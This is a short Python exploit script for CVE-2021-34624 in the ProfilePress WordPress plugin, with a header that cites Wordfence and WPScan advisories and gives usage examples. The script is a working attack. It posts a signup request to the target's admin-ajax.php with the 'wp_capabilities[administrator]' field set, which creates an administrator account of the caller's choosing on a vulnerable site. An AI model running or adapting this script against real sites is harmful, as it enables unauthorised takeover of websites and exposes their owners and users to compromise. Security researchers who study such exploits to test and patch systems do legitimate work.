'''
CVE-2021-34624
Download
ProfilePress from 3.0.0 - 3.1.3 allow a user creates the Administrator account.
Exploit: cm0s
Link: https://wordpress.org/plugins/wp-user-avatar/advanced/
Reference:
    - https://www.wordfence.com/blog/2021/06/easily-exploitable-critical-vulnerabilities-patched-in-profilepress-plugin/
    - https://wpscan.com/vulnerability/e12448ec-84a0-46aa-b280-5d9a80ee1e41

Usage:
    python3 CVE-2021-34624.py <domain> <username> <password>

Example:
    python3 CVE-2021-34624.py http://pwnme.me userhaxor passhaxor
'''

import requests
import sys

if len(sys.argv) != 4:
        print("CVE-2021-34624")
        print('''Usage:
    python3 CVE-2021-34624.py <domain> <username> <password>

Example:
    python3 CVE-2021-34624.py http://pwnme.me userhaxor passhaxor''')
        exit()

domain = sys.argv[1].rstrip('/')
username = sys.argv[2]
password = sys.argv[3]

headers = {
    'Content-Type' : 'application/x-www-form-urlencoded'
}

data = {
    'reg_username': '%s'%(username),
    'reg_email': 'foo@foo.bar',
    'reg_password': '%s'%(password),
    'reg_password_present': 'true',
    'wp_capabilities[administrator]': 1,
    'reg_first_name': 'foo',
    'reg_last_name': 'bar',
    'action': 'pp_ajax_signup'
}

url = domain + '/wp-admin/admin-ajax.php'

try:
    response = requests.post(url, headers=headers, data=data)
    if 'Registration successful' in response.text:
        print('Registration successful!')
    else:
        print('Registration failed!')
        print(response.text)
except Exception as e:
    print(e)